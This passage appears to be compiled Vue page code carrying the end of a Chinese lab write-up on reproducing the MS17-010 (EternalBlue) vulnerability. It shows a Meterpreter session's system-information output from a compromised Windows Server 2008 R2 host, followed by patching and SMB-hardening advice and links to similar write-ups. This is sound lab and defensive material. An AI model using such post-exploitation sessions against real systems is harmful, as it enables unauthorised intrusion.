staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br")])]),a("p",[s._v("查看系统信息")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("meterpreter "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" sysinfo             "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看目标主机系统信息")]),s._v("\nComputer        "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" WIN-C34GBVP79PU\nOS              "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" Windows Server "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2008")]),s._v(" R2 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6.1")]),s._v(" Build "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7601")]),s._v(", Service Pack "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(".\nArchitecture    "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" x64\nSystem Language "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" zh_CN\nDomain          "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" WORKGROUP\nLogged On Users "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("\nMeterpreter     "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" x64/windows\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("h2",{attrs:{id:"修复建议"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#修复建议"}},[s._v("#")]),s._v(" 修复建议")]),s._v(" "),a("ul",[a("li",[s._v("禁用SMB 1.0协议（或关闭端口445）")]),s._v(" "),a("li",[s._v("安装MS17-010相关安全补丁")]),s._v(" "),a("li",[s._v("使用网络隔离或防火墙规则减少暴露面")])]),s._v(" "),a("p",[s._v("参考、致谢：")]),s._v(" "),a("ul",[a("li",[a("a",{attrs:{href:"https://blog.csdn.net/qq_61839115/article/details/129951295",target:"_blank",rel:"noopener noreferrer"}},[s._v("【ms17-010】永恒之蓝漏洞复现"),a("OutboundLink")],1)]),s._v(" "),a("li",[a("a",{attrs:{href:"https://xz.aliyun.com/t/14485?time__1311=GqAxuQi%3DGQoCqGNDQiiQtwO6D97mCb7F4D#toc-12",target:"_blank",rel:"noopener noreferrer"}},[s._v("内网渗透之ms07010的多种打法"),a("OutboundLink")],1)]),s._v(" "),a("li",[a("a",{attrs:{href:"https://www.freebuf.com/vuls/324486.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("永恒之蓝漏洞复现实验"),a("OutboundLink")],1)]),s._v(" "),a("li",[a("a",{attrs:{href:"https://cjjkkk.github.io/ms17-010%E5%A4%8D%E7%8E%B0/",target:"_blank",rel:"noopener noreferrer"}},[s._v("ms17-010（永恒之蓝）漏洞复现"),a("OutboundLink")],1)])])])}),[],!1,null,null,null);a.default=t.exports}}]);